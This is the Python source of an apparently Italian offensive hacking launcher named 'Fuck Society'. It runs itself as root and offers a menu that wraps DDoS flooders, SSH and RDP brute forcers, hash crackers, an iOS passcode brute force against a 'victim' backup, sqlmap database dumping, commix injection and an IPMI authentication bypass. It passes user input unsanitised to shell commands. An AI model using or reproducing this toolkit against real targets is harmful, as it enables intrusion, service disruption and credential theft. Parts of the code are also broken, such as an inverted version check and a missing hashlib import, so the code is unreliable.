#!/usr/bin/python
# coding: utf8
# Autore: Skull00
import os,sys,time,readline,socket,requests,random
from time import sleep
import platform # cat os
import urllib2, json # Geo-Location
import struct # get gateway (+socket)
import re, uuid # get mac address
import webbrowser # open files in browser

reload(sys)
sys.setdefaultencoding('utf8') # for raw input ansi/unicode

biohazard = u"\u2623"
# Titolo terminale
sys.stdout.write("\x1b]2;" + biohazard + " Fuck Society " + biohazard + "\x07")

global end,white,red,blue,green,dark_gray,bright_green,bright_cyan,bright_yellow,underline,Tools,versione,autore
end = '\033[0m'
white = '\033[1;37m'
red = '\033[1;31m'
blue = '\033[1;34m'
green = '\033[0;32m'
dark_gray = '\033[1;30m'
bright_green = '\033[1;32m'
bright_cyan = '\033[1;36m'
bright_yellow = '\033[1;33m'
#
underline = '\033[4m'
Tools = bright_green+"186"+end
versione = red+"v1.2.0"+end
autore = red+"Skull00"+end

if sys.version_info.major >= 2.7:
    print("\n-# %sAttenzione%s: Questa versione non Ã¨ supportata dal tuo sistema"%(bright_yellow, end))
    print("-# Esegui %sinstaller.py%s per installare tutto il necessario\n"%(bright_green, end))
    sys.exit()

euid = os.geteuid()
if euid != 0:
    print("-# Permessi di root richiesti")
    time.sleep(.5)
    args = ['sudo', sys.executable] + sys.argv + [os.environ]
    # the next line replaces the currently-running process with the sudo
    os.execlpe('sudo', *args)

# Verifica se eseguito installer.py
try:
    import netifaces,paramiko
except ImportError:
    print("")
    print("-# Esegui %sinstaller.py%s per avviare il programma"%(bright_green,end))
    print("")
    sys.exit()

def get_gateway():
    with open("/proc/net/route") as fh:
            for line in fh:
                fields = line.strip().split()
                if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                    continue
                return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
#
def menu():
    sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=28, cols=91))
    sys.stdout.write(end)
    class MyCompleter(object):  # Custom completer
        def __init__(self, options):
            self.options = sorted(options)
        def complete(self, text, state):
            if state == 0:  # on first trigger, build possible matches
                if text:  # cache matches (entries that start with entered text)
                    self.matches = [s for s in self.options
                                        if s and s.startswith(text)]
                else:  # no text entered, all matches possible
                    self.matches = self.options[:]
            # return match indexed by state
            try:
                return self.matches[state]
            except IndexError:
                return None
    commands_list = [
    # Comandi - unica categoria
    "torghost","os","help","info","updatedb","banner","search",
    "ifconfig","macchanger","msfconsole","ftp","net_restart",
    "restart","reload","kill","quit","exit","ping","getip",
    # Local Scanning
    "nmap","netdiscover","amap","ciscotorch",
    # Gathering
    "geoip","whois","maltego","sn1per","red_hawk","ktfconsole","operativef",
    "dmitry","inspy","credmap","theharvester",
    # WebApp
    "xerxes","ufonet","zambie","goldeneye","recon-ng","sslscan","ipmipwn","vega","webscarab","thcssldos","owscan",
    "xsstracer","fbht","pybomber","whatweb","commix","joomscan","hping3","miranda","snmpcheck","dhcpig","xsstrike",
    "sqlmap","sshscan","pentmenu","a2sv","crips","vbscan","torshammer","siege","blackhydra","burpsuite","wafw00f",
    "brutesploit","medusa","jsql","dnsenum","dnsmap","dotdotpwn","metagoofil","sslyze","t50","nosqlmap","cewl","cr3dov3r",
    "cpscan","dtect","sechub","wpscan","zaproxy","zenmap","uniscan","cutycapt","responder","hash-identifier","skipfish",
    "droopescan","instarecon","dsxs","automater","intrace","smtpuserenum","angryfuzzer","dirbuster","sqldict","devploit",
    "xhydra","tulpar","bingoo","xattacker","knockmail","bluelog","fimap","infoga","dirb","nikto","hashbuster",
    "blazy","xsssniper","sublist3r","urlextractor","breacher","ip2host","parsero","ddos","drup","icloudbrutter",
    # WiFi
    "airgeddon","wifite","fakeauth","fluxion","wifiphisher",
    "routersploit","wirespy","wpsbreaker","netattack",
    # Sniffing
    "bettercap","morpheus","wireshark","ettercap","mitmf","mitmap","cdpsnarf","cookie-cadger","p0f",
    "sslstrip","voiphopper","driftnet",
    # Exploiting
    "chaos","overthruster","arcanus","evildroid","ezsploit","zirikatu","microsploit",
    "astroid","kautilya","termineter","wifijammer","yersinia","hashcrack","darksploit",
    "armitage","setoolkit","fatrat","eggshell","shellsploit","saint","koadic","onelin3r",
    "pentestly","debinject","ciscoge","wole","xspy","findmyhash","gen2kr","eflood",
    "beelogger","brutal","jexboss","weeman","u3pwn","ngrok","socialfish",
    "l0l","kayak","ioscrack","cheetah","powerfuzzer","instaburst",
    # MultiTool
    "hakkuf","penbox","simple-ducky","discover","zarp","sb0x","atscan","inguma","websploit","trity","dzjecter",
    # Others
    "printerspam","httrack","lynis","searchsploit"
    ]
    completer = MyCompleter(commands_list)
    readline.set_completer(completer.complete)
    readline.parse_and_bind('tab: complete')
    # input
    try:
        command_input = raw_input("(FS) > ")
    except KeyboardInterrupt:
        try:
            print("\n-# Premi nuovamente Ctrl+C per uscire")
            time.sleep(1)
            return menu()
        except KeyboardInterrupt:
            exit()
        except EOFError:
            print("\n\n-# Oh Oh! %sErrore%s insolito, smettila di cazzeggiare e datti da fare"%(red,end))
            return menu()
    except EOFError:
        print("\n\n-# Oh Oh! %sErrore%s insolito, smettila di cazzeggiare e datti da fare"%(red,end))
        return menu()
    tokens = command_input.split()
    try:
        command = tokens[0]
    except IndexError:
        command = None
    try:
        option = tokens[1]
    except IndexError:
        option = None
    try:
        argument = tokens[2]
    except IndexError:
        argument = None
    try:
        argument2 = tokens[3]
    except IndexError:
        argument2 = None
    try:
        argument3 = tokens[4]
    except IndexError:
        argument3 = None
    try:
        argument4 = tokens[5]
    except IndexError:
        argument4 = None
    args = tokens[1:]
    # comandi tecnici
    if command == 'help' or command == '?':
        help()
    elif command == 'info':
        info()
    elif command == 'clear' or command == 'reset':
        os.system(command)
        return menu()
    elif command == 'logo' or command == 'banner':
        logo_menu()
    if command == "search":
        if option:
            if option in commands_list:
                print("-# %s trovato"%(bright_green + option + end))
                return menu()
            if option not in commands_list:
                print("-# Nessun risultato per %s"%(bright_green+option+end))
                print("-# Risultati simili:")
            incms = 0
            for e in commands_list:
                if "%s"%option in e:
                    print(" %s-%s %s"%(bright_green,end,e))
                    incms += 1
            if incms == 0:
                print(" %s-%s Nessun risultato"%(red,end))
        else:
            print("-# Uso: $ search <nome tool>")
        return menu()
    elif command == None:
        print("-# %shelp%s per i comandi"%(blue,end))
        return menu()
    # comandi di sistema
    elif command == 'restart':
        sys.stdout.write("-# Fermo i servizi ")
        sys.stdout.flush()
        os.system("service postgresql stop && echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.stdout.write("- %sOK%s\n"%(bright_green,end))
        sys.stdout.flush()
        time.sleep(1)
        os.system("echo 'file destinato al macello' > Logs/verify_first_boot.txt") # verifica primo avvio
        logo_menu()
    elif command == 'reload':
        sys.stdout.write("-# Ricarico i servizi ")
        sys.stdout.flush()
        os.system("service postgresql restart && echo 1 > /proc/sys/net/ipv4/ip_forward")
        sys.stdout.write("- %sOK%s\n"%(bright_green,end))
        sys.stdout.flush()
        return menu()
    elif command == 'kill':
        sys.stdout.write("-# Fermo i servizi ")
        sys.stdout.flush()
        os.system("service postgresql stop && echo 0 > /proc/sys/net/ipv4/ip_forward")
        sys.stdout.write("- %sOK%s\n"%(bright_green,end))
        sys.stdout.flush()
        return menu()
    elif command == 'exit' or command == 'quit':
        exit()
    #
    elif command == 'updatedb':
        os.system("updatedb")
        print("-# %sOK%s - Database aggiornato"%(bright_green,end))
        return menu()
    elif command == 'os':
        osc = command_input.split("os")
        osc = osc[1]
        if osc == "":
            print("-# %sos%s esegue il comando a seguire nel terminale"%(blue,end))
            return menu()
        os.system(osc)
        return menu()
    elif command == 'net_restart':
        os.system("service network-manager restart")
        print("-# %sOK%s - Servizio %snetwork-manager%s riavviato"%(bright_green,end, blue,end))
        return menu()
    elif command == 'service':
        os.system(command_input)
        return menu()
    elif command == 'ifconfig':
        if option:
            print("")
            os.system(command_input)
            print("")
            return menu()
        try:
            print("[   Interface ]-# " + blue + netifaces.gateways()['default'][netifaces.AF_INET][1] + end)
        except KeyError:
            pass
        print("[     Gateway ]-# " + blue + str(get_gateway()) + end)
        try:
            print("[    Local IP ]-# " + blue + [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0] + end)
        except socket.error:
            pass
        print("[ Mac Address ]-# " + blue + ':'.join(re.findall('..', '%012x' % uuid.getnode())) + end)
        try:
            print("[   Public IP ]-# " + blue + requests.get('http://ip.42.pl/raw').text + end)
        except requests.exceptions.ConnectionError:
            pass
        host = "8.8.8.8"
        port = 53
        timeout = 3
        try:
            socket.setdefaulttimeout(timeout)
            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
            pass
        except Exception:
            print("-# Nessuna connessione a internet.")
        return menu()
    elif command == 'ping':
        if option:
            os.system("ping %s"%(option))
            return menu()
        else:
            print("-# Uso: $ ping <indirizzo>")
            return menu()
    elif command == "getip":
        if option:
            if "http://" in option:
                option = option.split("http://")[1]
            if "https://" in option:
                option = option.split("https://")[1]
            try:
                print("-# IP: "+bright_green+socket.gethostbyname("%s"%(option))+end)
            except socket.gaierror:
                print("-# %sErrore%s: Indirizzo sconosciuto"%(red,end))
        else:
            print("-# Uso: getip <indirizzo>")
        return menu()
    # Spoofing
    elif command == 'macchanger' or command == 'mac':
        os.system("xterm -T 'Changing Mac Address...' -e 'ifconfig wlan0 down && ifconfig eth0 down && macchanger -r wlan0 && macchanger -r eth0 && ifconfig eth0 up && ifconfig wlan0 up && service network-manager restart'")
        print("-# %sOK%s - Indirizzo MAC cambiato"%(bright_green,end))
        return menu()
    elif command == 'torghost':
        if option == 'start':
            os.system("xterm -T 'TorGhost' -e 'torghost start'")
            print("-# %sOK%s - TorGhost Avviato"%(bright_green,end))
            return menu()
        elif option == 'stop':
            os.system("xterm -T 'TorGhost' -e 'torghost stop'")
            print("-# %sOK%s - TorGhost Fermato"%(bright_green,end))
            return menu()
        else:
            print("-# %sErrore%s: Argomenti non validi"%(red,end))
            print("-# Uso: $ torghost <start/stop>")
            return menu()

    # Cracking
    elif command == 'ioscrack':
        if option:
            if option == 'auto':
                os.system("cd Tools/iOSRestrictionBruteForce/ && python ioscrack.py -a -v")
                print("")
                return menu()
            if 'auto' not in option:
                os.system("cd Tools/iOSRestrictionBruteForce/ && python ioscrack.py -b %s -v"%(option))
                print("")
                return menu()
        else:
            print("")
            print("-# %sAttenzione%s:"%(bright_yellow,end))
            print("   Se iTunes Ã¨ installato esegui il backup del dispositivo vittima e avvia ioscrack con")
            print("   %sioscrack auto%s."%(blue,end))
            print("   Se iTunes non Ã¨ installato inserisci manualmente la cartella di backup con")
            print("   %sioscrack /path/to/backup/folder%s."%(blue,end))
            print("")
            print("-# Uso: $ ioscrack <auto / [path/to/backup/folder]> ")
            print("")
            return menu()
    elif command == 'cheetah':
        if option:
            command = "cd Tools/cheetah/ && python cheetah.py -u %s"%(option)
            if argument:
                if os.path.exists(argument) == False:
                    print("-# %sErrore%s: File non trovato"%(red,end))
                    return menu()
                command = "cd Tools/cheetah/ && python cheetah.py -u %s -p %s"%(option, argument)
            os.system(command)
            print("")
        else:
            print("-# Uso: $ cheetah <target> [/full/path/to/wordlist.txt]")
        return menu()
    elif command == 'medusa':
        modules_list = ["afp","cvs","ftp","http","imap","mssql","mysql","nntp","pop3","postgres","rdp","rexec","rsh","smbnt","ssh","svn","telnet","vmauthd","vnc","wrapper"]
        if option:
            host = option
            if argument:
                user = argument
                if argument2: # psw file
                    if os.path.exists(argument2) == False:
                        print("-# %sErrore%s: File non trovato"%(red,end))
                        return menu()
                    wordlist = argument2
                    if argument3:
                        if argument3 in modules_list:
                            module = argument3
                            command = "xterm -T 'Medusa' -e 'medusa -h %s -u %s -P %s -M %s;echo '';echo Press ENTER To Close;read'"%(host, user, wordlist, module)
                            if argument4:
                                threads = argument4
                                try:
                                    if int(threads):
                                        pass
                                except ValueError:
                                    print("-# %sErrore%s: Numero di tentativi non valido"%(red,end))
                                    return menu()
                                command = "xterm -T 'Medusa' -e 'medusa -h %s -u %s -P %s -M %s -t %s;echo '';echo Press ENTER To Close;read'"%(host, user, wordlist, module, threads)
                            os.system(command)
                        else:
                            print("-# %sErrore%s: Modulo non valido"%(red,end))
                    else:
                        print("-# %sErrore%s: Modulo mancante"%(red,end))
                else:
                    print("-# %sErrore%s: Wordlist mancante"%(red,end))
            else:
                print("-# %sErrore%s: Utente mancante"%(red,end))
        else:
            print("")
            print("-# Uso: $ medusa <host> <user> <pswdfile.txt> <module> [threads n. (facoltativo)]")
            print("")
            print("-# %sModuli%s:"%(bright_green,end))
            print("/ afp / cvs / ftp / http / imap / mssql / mysql / nntp / pop3 / postgres / rdp / rexec")
            print("/ rsh / smbnt / ssh / svn / telnet / vmauthd / vnc / wrapper")
            print("")
        return menu()
    elif command == 'findmyhash':
        hash_list = ["MD4","MD5","SHA1","SHA224","SHA256","SHA384","SHA512","RMD160","GOST","WHIRLPOOL","LM","NTLM","MYSQL","CISCO7","JUNIPER","LDAP_MD5","LDAP_SHA1"]
        if option:
            if option not in hash_list:
                print("-# %sErrore%s: Algoritmo non valido"%(red,end))
                return menu()
            if argument:
                os.system("findmyhash %s -h %s"%(option, argument))
                return menu()
            else:
                print("-# %sErrore%s: Hash mancante"%(red,end))
                return menu()
        else:
            print("")
            print("-# Uso: $ findmyhash <algoritmo> <hash>")
            print("")
            print("-# %sAlgoritmi%s:"%(bright_green,end))
            print(" [ MD4 / MD5 / SHA1 / SHA224 / SHA256 / SHA384 / SHA512 / RMD160 / GOST / WHIRLPOOL / LM ]")
            print(" [ NTLM / MYSQL / CISCO7 / JUNIPER / LDAP_MD5 / LDAP_SHA1 ]")
            print("")
            return menu()
    elif command == 'hash-identifier':
        print("")
        os.system("gnome-terminal -- hash-identifier")
        return menu()
    elif command == 'hashcrack':
        wdl_alg_list = ["md5","sha1","sha224","sha256","sha384","sha512"]
        nowdl_alg_list = ["md4","md5","sha1","sha224","sha256","sha384","sha512","juniper","lm","ntlm","whirlpool","rmd160","gost","mysql","cisco7","ldap_md5","ldap_sha1"]
        not_supported = ["md4","juniper","lm","ntlm","whirlpool","rmd160","gost","mysql","cisco7","ldap_md5","ldap_sha1"]
        wordlist = None # default
        def hashcrack(algorithm, hash, wordlist):
            linecount = 0
            start = time.time()
            if algorithm == "md5":
                h = hashlib.md5
            elif algorithm == "sha1":
                h = hashlib.sha1
            elif algorithm == "sha224":
                h = hashlib.sha224
            elif algorithm == "sha256":
                h = hashlib.sha256
            elif algorithm == "sha384":
                h = hashlib.sha384
            elif algorithm == "sha512":
                h = hashlib.sha512
            if wordlist == None:
                # without wordlist
                os.system("findmyhash %s -h %s"%(algorithm,hash))
                return menu()
            if wordlist != None:
                if algorithm not in wdl_alg_list:
                    print("-# %sErrore%s: Algoritmo non supportato o non valido"%(red,end))
                    return menu()
                with open(wordlist, 'r') as encrypter:
                    print("")
                    for data in encrypter:
                        data = data.split()
                        for line in data:
                            #print line
                            try:
                                crypt = h(line).hexdigest()
                                sys.stdout.write('\r' + " > Parola Testata: " + str(line) + " " * 20)
                                sys.stdout.flush()
                                linecount += 1
                            except (KeyboardInterrupt,EOFError):
                                sys.exit("\n\n-# Interrotto")
                            if hash == crypt:
                                end_ = time.time()
                                print("\n")
                                print("[%s] Tempo Trascorso / %s secondi"%(bright_yellow+"*"+end, round((end_-start), 2)))
                                print("[%s] Parole Testate  / %s"%(bright_yellow+"*"+end, linecount))
                                print("[%s] Hash            / %s"%(bright_green+"+"+end, hash))
                                print("[%s] Testo Originale / %s\n"%(bright_green+"+"+end, line))
                                return menu()
                # if failed
                end_ = time.time()
                print("\n\n[%s] Parole Testate  / %s"%(bright_yellow+"*"+end, linecount))
                print("[%s] Tempo Trascorso / %s secondi"%(bright_yellow+"*"+end, round((end_-start), 2)))
                print("[%s] Nessun Risultato\n"%(red+"-"+end))
                return menu()
        if option: # algorithm
            if option not in nowdl_alg_list:
                print("-# %sErrore%s: Algoritmo non supportato o non valido"%(red,end))
                return menu()
            if argument: # hash
                algorithm = option
                hash = argument # hashSpecificato
                if argument2: # wordlist
                    wordlist = argument2 # wordlistSpecificata
                    if os.path.exists(wordlist) == False:
                        print("-# %sErrore%s: File non trovato"%(red,end))
                        return menu()
                hashcrack(algorithm, hash, wordlist)
            else: # hash
                print("-# %sErrore%s: Hash richiesto"%(red,end))
                return menu()
        else: # option
            print("")
            print("-# Uso: $ hashcrack <algoritmo> <hash> [wordlist.txt]")
            print("")
            print("-# %sAlgoritmi Supportati con Wordlist%s:"%(bright_green,end))
            print("-# md5 / sha1 / sha224 / sha256 / sha384 / sha512 /")
            print("")
            print("-# %sAlgoritmi Supportati%s:"%(bright_green,end))
            print("-# md4 / md5 / sha1 / sha224 / sha256 / sha384 / sha512   / juniper   / lm   /")
            print("-# whirlpool / rmd160 / gost / mysql  / cisco7 / ldap_md5 / ldap_sha1 / ntlm /")
            print("")
            return menu()
    elif command == "gen2kr":
        if option:
            os.system("touch Logs/fs_tmp_wd.txt")
            text = option
            output = argument
            if output == None:
                print("-# %sErrore%s: Nessun file di output specificato"%(red,end))
                return menu()
            if ".txt" not in output:
                output = output + ".txt"
            if "," not in text:
                if ".txt" not in text:
                    command = "cd Tools/Gen2kr && ./gen2kr -w ../../Logs/fs_tmp_wd.txt -o ../../Logs/%s -c -n -y -z"%(output)
                    os.system("echo %s > Logs/fs_tmp_wd.txt"%(text))
                if ".txt" in text:
                    if os.path.exists(text) == False:
                        print("-# %sErrore%s: File di input non trovato"%(red,end))
                        return menu()
                    command = "cd Tools/Gen2kr && ./gen2kr -w %s -o ../../Logs/%s -c -n -y -z"%(text, output)
            if "," in text:
                text = text.split(",")
                f = open("Logs/fs_tmp_wd.txt","w")
                f.write("\n".join(s for s in text))
                f.close()
                command = "cd Tools/Gen2kr && ./gen2kr -w ../../Logs/fs_tmp_wd.txt -o ../../Logs/%s -c -n -y -z"%(output)
            print("")
            os.system(command)
            os.system("rm Logs/fs_tmp_wd.txt")
            print("[%s+%s] Wordlist creata in Logs/%s\n"%(bright_green,end,output))
            return menu()
        else:
            print("-# Wordlist Generator")
            print("-# Uso: $ gen2kr <[/full/path/to/inputfile.txt]/testo[,testo,...]> <output.txt>")
            return menu()
    elif command == "hashbuster":
        os.system("cd Tools/Hash-Buster/ && python hash.py")
        print("")
        return menu()

    # Sistema
    elif command == 'msfconsole' or command == 'msf':
		os.system("gnome-terminal -- msfconsole")
		return menu()
    elif command == 'ftp':
        os.system("gnome-terminal -- ftp")
        return menu()

    # Scanning
    elif command == 'nmap':
        if option:
            print("")
            os.system(command_input)
            print("")
        else:
            print("-# Uso: $ nmap <comando che vuoi>")
        return menu()
    elif command == 'netdiscover':
        os.system("netdiscover -p")
        return menu()

    # Gathering
    elif command == 'geoip':
        if option:
            checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
            "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
            "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
            for w in option:
                if w in checkwords:
                    if "http://" in option:
                        option = option.split("http://")[1]
                    if "https://" in option:
                        option = option.split("https://")[1]
                    break
            try:
                getip = socket.gethostbyname("%s"%(option))
            except socket.gaierror:
                print("-# %sErrore%s: Indirizzo sconosciuto"%(red,end))
                return menu()
            target = getip
            try:
                url = "http://ip-api.com/json/"
                response = urllib2.urlopen(url + target)
                data = response.read()
                values = json.loads(data)
                ip = blue + values['query'] + end
                try:
                    country = values['country']
                except KeyError:
                    country = "-"
                try:
                    region = values['regionName']
                except KeyError:
                    region = "-"
                try:
                    city = values['city']
                except KeyError:
                    city = "-"
                try:
                    zip_code = values['zip']
                except KeyError:
                    zip_code = "-"
                try:
                    isp = red + values['isp'] + end
                except KeyError:
                    isp = "-"
                try:
                    gestore = red + values['as'] + end
                except KeyError:
                    gestore = "-"
                try:
                    lat_lon = bright_green + str(values['lat']) + " / " + str(values['lon']) + end
                except KeyError:
                    lat_lon = "-"
                try:
                    timezone = bright_green + values['timezone'] + end
                except KeyError:
                    timezone = "-"
                try:
                    maps = "%shttps://www.google.com/maps/search/?api=1&query=%s,%s%s"%(bright_green, str(values['lat']), str(values['lon']), end)
                except KeyError:
                    maps = "-"
                print("[        IP ]-# %s"%(ip))
                print("[   Nazione ]-# %s"%(country))
                print("[   Regione ]-# %s"%(region))
                print("[     CittÃ  ]-# %s"%(city))
                print("[ C.Postale ]-# %s"%(zip_code))
                print("[  Provider ]-# %s"%(isp))
                print("[   Gestore ]-# %s"%(gestore))
                print("[  Lat/Long ]-# %s"%(lat_lon))
                print("[  F.Orario ]-# %s"%(timezone))
                print("[    G.Maps ]-# %s"%(maps))
            except socket.timeout:
                print("-# %sErrore%s: Nessuna Connessione"%(red,end))
            except urllib2.URLError:
                print("-# %sErrore%s: Nessuna Connessione"%(red,end))
            return menu()
        else:
            print("-# Uso: $ geoip <indirizzo IP>")
            return menu()
    elif command == 'whois':
        if option:
            checkwords = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O",
            "P","Q","R","S","T","U","V","W","X","Y","Z","a","b","c","d","e","f","g",
            "h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]
            for w in option:
                if w in checkwords:
                    if "http://" in option:
                        option = option.split("http://")[1]
                    if "https://" in option:
                        option = option.split("https://")[1]
                    break
            try:
                getip = socket.gethostbyname("%s"%(option))
            except socket.gaierror:
                print("-# %sErrore%s: Indirizzo sconosciuto"%(red,end))
                return menu()
            option = getip
            os.system("whois -H %s"%(option))
            return menu()
        else:
            print("-# Uso: $ whois <indirizzo>")
            return menu()
    elif command == 'maltego':
        os.system("gnome-terminal -- maltego")
        return menu()
    elif command == 'sn1per':
        if option:
            os.system("cd Tools/Sn1per/ && ./sniper -t %s -o -re"%(option))
            print("")
            return menu()
        else:
            print("-# Uso: $ sn1per <indirizzo>")
            return menu()
    elif command == 'dmitry':
        if option:
            os.system("dmitry %s -i -w -s -e -p -o Logs/dmitry_log"%(option))
            print("\n-# Informazioni salvate in %sLogs/dmitry_log.txt%s\n"%(blue,end))
            return menu()
        else:
            print("-# Uso: $ dmitry <indirizzo>")
            return menu()
    elif command == 'red_hawk' or command_input == 'red hawk':
        os.system("gnome-terminal -- php " + os.getcwd() + "/Tools/RED_HAWK/rhawk.php")
        return menu()
    elif command == 'ktfconsole' or command == 'ktf':
        os.system("gnome-terminal -- ktf.console")
        return menu()
    elif command == 'operativef' or command == 'operative':
        os.system("cd Tools/operative-framework/ && python operative.py")
        logo_menu()
    elif command == 'inspy':
        if option:
            if argument:
                job_list = option.split()
                print("")
                for elements in job_list:
                    os.system('echo "%s" > Logs/inspy.txt'%(elements))
                    print("Ricerca: -# %s%s%s"%(blue,elements,end))
                os.system("inspy --empspy Logs/inspy.txt %s"%(argument))
                os.system("rm Logs/inspy.txt")
                print("")
                return menu()
            else:
                print("-# %sErrore%s: %sLuogo%s richiesto"%(red,end, blue,end))
        else:
            print("-# Uso: $ inspy <mestiere> <luogo>")
        return menu()
    elif command == 'tulpar':
        modules_list = ["links","e-mail","sql","xss","crawl","whois"]
        if option:
            if option not in modules_list:
                print("-# %sErrore%s: Modulo non valido"%(red,end))
                return menu()
            if argument:
                target = argument
                if 'http://' not in argument:
                    target = "http://"+argument
                if 'http://' in argument or 'https://' in argument:
                    pass
                print("")
                os.system("cd Tools/tulpar/ && python tulpar.py %s %s"%(option,target))
                print("")
                return menu()
            else:
                print("-# %sErrore%s: Indirizzo richiesto"%(red,end))
                return menu()
        else:
            print("")
            print("-# Uso: $ tulpar <modulo> <indirizzo>")
            print("")
            print("-# %sModuli%s:"%(bright_green,end))
            print(" [ links / e-mail / sql / xss / crawl / whois ]")
            print("")
            return menu()
    elif command == 'credmap':
        if option:
            os.system("cd Tools/credmap && python credmap.py --email %s"%(option))
            print("")
        else:
            print("-# Uso: $ credmap <username/email>")
        return menu()
    elif command == 'theharvester':
        if option:
            target = option
            if "http://" in option:
                target = option.split("http://")
                target = target[1]
            if "https://" in option:
                target = option.split("https://")
                target = target[1]
            if "www." in option or "www." in target:
                target = option.split("www.")
                target = target[1]
            os.system("theharvester -d %s -b all -v -n -t"%(target))
            print("")
            return menu()
        else:
            print("-# Uso: $ theharvester <indirizzo>")
            return menu()
    elif command == "dzjecter":
        os.system("gnome-terminal -- Dzjecter")
        return menu()

    # WebApp
    elif command == 'ipmipwn':
        if option:
            os.system("cd Tools/IPMIPWN/ && python ipmipwn.py %s"%(option))
            return menu()
        else:
            print("")
            print("-# %sAttenzione%s: Assicurati che l'host abbia la porta 623 aperta. Questo tool utilizza la "%(bright_yellow,end))
            print("               vulnerabilitÃ  'Cipher 0' per il bypass dell'autenticazione.")
            print("")
            print("-# Uso: $ ipmipwn <indirizzo>")
            print("")
            return menu()
    elif command == 'intrace':
        if option:
            if "http://" in option:
                option = option.split("http://")[1]
            if "https://" in option:
                option = option.split("https://")[1]
            port = 80
            if 'https://' in option:
                port = 443
            os.system("intrace -h %s -p %s -s 4"%(option, port))
            print("")
        else:
            print("-# Uso: $ intrace <indirizzo>")
        return menu()
    elif command == 'miranda':
        os.system("gnome-terminal -- miranda")
        return menu()
    elif command == 'powerfuzzer':
        os.system("open powerfuzzer")
        return menu()
    elif command == 'burpsuite':
        os.system("open burpsuite")
        return menu()

    # DDoS
    elif command == 'xerxes':
        if option:
            os.system("xterm -T 'Xerxes' -e './Tools/xerxes/xerxes %s 80'"%(option))
        else:
            print("-# Uso: $ xerxes <indirizzo>")
        return menu()
    elif command == 'ufonet':
        os.system("xterm -T 'UfoNet' -e 'cd Tools/ufonet/ && ./ufonet --download-zombies'")
        time.sleep(.02)
        os.system("xterm -T 'UfoNet Logs' -e 'cd Tools/ufonet/ && ./ufonet --gui'")
        return menu()
    elif command == 'zambie':
        os.system("cd Tools/zambie/ && python zambie.py")
        logo_menu()
    elif command == 'goldeneye':
        if option:
            target = option
            if 'http://' not in option:
                if "https://" in option:
                    pass
                else:
                    target = "http://" + option
            os.system("gnome-terminal -- goldeneye %s -m random"%(target))
        else:
            print("-# Uso: $ goldeneye <indirizzo>")
        return menu()
    elif command == 'torshammer':
        if option:
            os.system("xterm -T 'TorShammer' -e 'python Tools/torshammer/torshammer.py -t %s'"%(option))
        else:
            print("-# Uso: $ torshammer <indirizzo>")
        return menu()
    elif command == 't50':
        if option:
            os.system("gnome-terminal -- t50 %s --flood --turbo"%(option))
        else:
            print("-# Uso: $ t50 <indirizzo>")
        return menu()
    elif command == 'thcssldos':
        if option:
            if 'www.' in option or '.' not in option or len(option) < 7:
                print("-# %sErrore%s: Indirizzo IP non valido"%(red,end))
                return menu()
            port = 80
            os.system("thc-ssl-dos %s %s --accept"%(option, port))
            print("")
        else:
            print("-# Uso: $ thcssldos <indirizzo IP>")
        return menu()

    #injection
    elif command == 'sqlmap':
        modules_list = ["scan", "inj"]
        if option:
            if option not in modules_list:
                print("-# %sErrore%s: Modulo non valido"%(red,end))
                return menu()
            elif option == 'scan':
                if argument:
                    os.system("sqlmap -g %s"%(argument))
                    return menu()
                else:
                    print("-# %sErrore%s: Modulo %sscan%s richiede un indirizzo"%(red,end, blue,end))
                    return menu()
            elif option == 'inj':
                if argument:
                    if argument2:
                        if argument3:
                            if argument4:
                                os.system("sqlmap -u %s -D %s -T %s -C %s --dump"%(argument,argument2,argument3,argument4))
                                return menu()
                            os.system("sqlmap -u %s -D %s -T %s --columns"%(argument,argument2,argument3))
                            return menu()
                        os.system("sqlmap -u %s -D %s --tables"%(argument,argument2))
                        return menu()
                    os.system("sqlmap -u %s --dbs"%(argument))
                    return menu()
                else: # if argument
                    print("-# %sErrore%s: Modulo %sinj%s richiede un indirizzo"%(red,end, blue,end))
                    return menu()
        else: # if option
            print("")
            print("-# Uso: $ sqlmap [modulo] <target> [<database> <table> <column(s)>]")
            print(" ==> $ sqlmap scan <target>")
            print(" ==> $ sqlmap inj  <target> <database> <table> <column(s)>")
            print("")
            print("-# %sModuli%s:"%(bright_green,end))
            print(" [ scan / inj ]")
            print("")
            print("-# %sAttenzione%s:"%(bright_yellow,end))
            print(" <database>, <table>, <column(s)> vanno inseriti con l'avanzare dell'attacco.")
            print(" # Modulo %sinj%s:"%(blue,end))
            print(" $ %ssqlmap inj <target>%s - ottieni <database>"%(blue,end))
            print(" $ %ssqlmap inj <target> <database>%s - ottieni <table>"%(blue,end))
            print(" $ %ssqlmap inj <target> <database> <table>%s - ottieni <column(s)>"%(blue,end))
            print(" $ %ssqlmap inj <target> <database> <table> <column(s)>%s - ottieni il contenuto di <column(s)>"%(blue,end))
            print("")
            print("-# %sAttenzione%s:"%(bright_yellow,end))
            print(" Nel modulo %sinj%s, per ottenete informazioni da piÃ¹ colonne contemporaneamente inserisci"%(blue,end))
            print(" <column(s)> nel seguente modo:")
            print(" %s<column>,<column>,<column>,...%s"%(blue,end))
            print("")
            return menu()
    elif command == 'commix':
        if option:
            command = "commix -u %s --ignore-401 --random-agent --force-ssl --all "%(option)
            if argument == 'l3' and argument2 == 'shellshock' or argument == 'shellshock' and argument2 == 'l3':
                print("-# %sErrore%s: %sshellshock%s e %sl3%s non possono essere usati in contemporanea"%(red,end, blue,end, blue,end))
                return menu()
            elif argument == 'l3':
                command = command + "--level=3"
            elif argument == 'shellshock':
                command = command + "--shellshock"
            os.system(command)
            return menu()
        else:
            print("")
            print("-# Uso: $ commix <indirizzo> [opzioni]")
            print("")
            print("-# %sOpzioni%s:"%(bright_green,end))
            print(" l3         - Usa livello 3 per l'injection (lento)")
            print(" shellshock - Usa metodo shellshock per l'injection")
            print("")
            return menu()
